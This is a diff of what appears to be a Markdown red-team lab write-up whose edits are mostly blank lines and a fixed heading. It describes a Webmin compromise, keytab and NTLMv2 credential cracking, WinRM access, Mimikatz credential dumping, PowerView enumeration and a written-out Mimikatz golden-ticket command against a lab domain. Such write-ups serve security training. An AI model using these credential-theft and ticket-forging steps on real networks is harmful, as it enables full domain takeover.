@@ -407,8 +407,7 @@ Upgrade: Immediately upgrade Webmin to lates version, which patches the vulnerab
 Access Restriction: Limit access to Webmin to trusted IP addresses only, preferably localhost, by editing `miniserv.conf`.
 ```
 
-#  
-pgraded to a bash shell
+# We upgraded to a bash shell
 
 ![[Pasted image 20250512192545.png]]
 
@@ -424,12 +423,15 @@ We find a github tool that allows us to extract information from Type .Keytab Fi
 ![[Pasted image 20250512193909.png]]
 
 After obtaining the hash NTLMV2 decrypte it and we get a key 
+
 ![[Pasted image 20250512194413.png]]
 
 We used the credentials extracted from the keytab file.
+
 ![[Pasted image 20250512194651.png]]
 
 They are valid for WinRM (Windows Remote Management).
+
 ![[Pasted image 20250512194902.png]]
 
 
@@ -481,9 +483,11 @@ We loaded Mimikatz and ran it to test credential extraction:
 ![[Pasted image 20250512202312.png]]
 
 We also attempted to extract all possible credentials stored in the system’s memory
+
 ![[Pasted image 20250512202334.png]]
 
 We extracted the password hashes of local users from the SAM (Security Account Manager)
+
 ![[Pasted image 20250512203353.png]]
 
 I also uploaded the Mimikatz binary to the target machine to try and retrieve additional information
@@ -494,12 +498,12 @@ kerberos::golden /user:Administrator /domain:child.redteam.corp /sid:S-1-5-21-23
 ```
 
 ![[Pasted image 20250512211423.png]]
-
 # AD Enumeration 
 
 We uploaded PowerView to gather more information about the Active Directory environment.
 
 We import the necessary modules
+
 ```python
 PS C:\Users\Administrator\Desktop> Import-Module ./PowerView.ps1
 ```
@@ -508,6 +512,7 @@ We gathered information about the domain
 ![[Pasted image 20250512210444.png]]
 
 # Golden Ticket Attack 
+
 We ran Mimikatz again and attempted a Golden Ticket attack using the information collected
 
 ```python
@@ -515,6 +520,7 @@ We ran Mimikatz again and attempted a Golden Ticket attack using the information
 ```
 
 We perform the gold ticket attack
+
 ```python
 kerberos::golden /user:Administrator /domain:child.redteam.corp /sid:S-1-5-21-2332039752-785340267-2377082902 /sids:S-1-5-21-1882140339-3759710628-635303199-500 /krbtgt:24dd6646fd7e11b60b6a9508e6fe7e5a /ptt
 ```
